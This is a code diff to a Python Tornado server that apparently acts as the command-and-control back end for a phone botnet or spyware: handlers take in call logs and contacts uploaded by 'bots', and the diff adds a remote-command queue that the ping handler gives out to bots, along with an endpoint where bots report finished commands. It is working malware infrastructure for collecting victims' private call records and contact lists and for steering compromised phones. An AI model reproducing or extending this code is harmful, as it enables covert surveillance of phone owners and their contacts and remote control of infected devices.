@@ -22,7 +22,7 @@ Created on Mar 15, 2012
 import json
 import logging
 
-from models import PhoneBot, CallInfo, Contact
+from models import PhoneBot, CallInfo, Contact, RemoteCommand
 from datetime import datetime
 from handlers.BaseHandlers import BotBaseHandler
 from tornado.web import RequestHandler
@@ -72,24 +72,24 @@ class BotCallsHandler(BotBaseHandler):
 
     @bots
     def post(self, *args, **kwargs):
-        #try:
-        jsonCalls = self.get_argument("jsonCalls")
-        calls = json.loads(jsonCalls)
-        for key in calls.keys():
-            call = json.loads(calls[key])
-            phone_call = CallInfo(
-                    phone_bot_id = self.bot.id,
-                    call_type = call['callType'],
-                    number_type = call['numberType'],
-                    phone_number = call['phoneNumber'],
-                    contact_name = call['contactName'],
-            )
-            self.dbsession.add(phone_call)
-        self.dbsession.flush()
-        #except:
-        #    self.write("error")
-        #    self.finish()
-        #    return
+        try:
+            jsonCalls = self.get_argument("jsonCalls")
+            calls = json.loads(jsonCalls)
+            for key in calls.keys():
+                call = json.loads(calls[key])
+                phone_call = CallInfo(
+                        phone_bot_id = self.bot.id,
+                        call_type = call['callType'],
+                        number_type = call['numberType'],
+                        phone_number = call['phoneNumber'],
+                        contact_name = call['contactName'],
+                )
+                self.dbsession.add(phone_call)
+            self.dbsession.flush()
+        except:
+            self.write("error")
+            self.finish()
+            return
         self.write("ok")
         self.finish()
 
@@ -104,7 +104,7 @@ class BotContactsHandler(BotBaseHandler):
             self.finish()
             return
         new_contact = json.loads(jsonContact)
-        if Contact.by_phone_number(new_contact['phoneNumber']) == None:
+        if Contact.by_phone_number(new_contact['phoneNumber'].replace(";", "")) == None:
             contact = Contact(
                 phone_bot_id = self.bot.id,
                 name = new_contact['contactName'].replace(";", "").encode('utf-8', 'ignore'),
@@ -120,24 +120,33 @@ class BotSmsHandler(BotBaseHandler):
 
     @bots
     def post(self, *args, **kwargs):
+        ''' Collects Sms information from bot '''
         pass
-
-class BotSendSmsHandler(BotBaseHandler):
-
-    @bots
-    def post(self, *args, **kwargs):
-        try:
-            contact_id = self.get_argument("sms-contact")
-            text_message = self.get_argument("sms-text")
-        except:
-            self.render("user/error.html", operation = "Send SMS", errors = "Missing parameters")
-            return
 
 class BotPingHandler(BotBaseHandler):
 
     @bots
     def get(self, *args, **kwargs):
-        ''' Updates the last_seen '''
+        ''' Updates the last_seen, sends commands if they exist '''
         self.bot.last_seen = datetime.now()
+        if 0 < RemoteCommand.qsize(self.bot.id):
+            remote_command = RemoteCommand.pop(self.bot.id)
+            self.write(remote_command.command)
+        else:
+            self.write("nop")
         self.dbsession.add(self.bot)
         self.dbsession.flush()
+        self.finish()
+
+class BotCompletedCommandHandler(BotBaseHandler):
+
+    @bots
+    def get(self, *arg, **kwargs):
+        ''' Bot reports here when a remote command has been completed successfully '''
+        if 0 < RemoteCommand.qsize(self.bot.id):
+            remote_command = RemoteCommand.pop(self.bot.id)
+            remote_command.completed = True
+            self.dbsession.add(remote_command)
+            self.dbsession.flush()
+        self.write('ok')
+        self.finish()
